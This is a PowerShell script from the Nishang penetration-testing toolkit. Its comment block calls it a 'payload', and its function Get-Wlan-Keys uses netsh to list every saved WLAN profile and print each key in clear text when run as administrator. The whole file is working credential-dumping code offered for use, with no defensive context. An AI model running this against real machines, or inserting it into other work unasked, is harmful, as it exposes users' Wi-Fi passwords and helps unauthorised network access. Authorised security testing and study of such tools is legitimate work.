<#
.SYNOPSIS
Nishang Payload which dumps keys for WLAN profiles.

.DESCRIPTION
This payload dumps keys in clear text for saved WLAN profiles.
The payload must be run from as administrator to get the keys.

.EXAMPLE
PS > Get-WLAN-Keys

.LINK
http://poshcode.org/1700
https://github.com/samratashok/nishang
#>


function Get-Wlan-Keys 
{

[CmdletBinding()]
Param ()

    $wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
    $exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
    $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
   
}
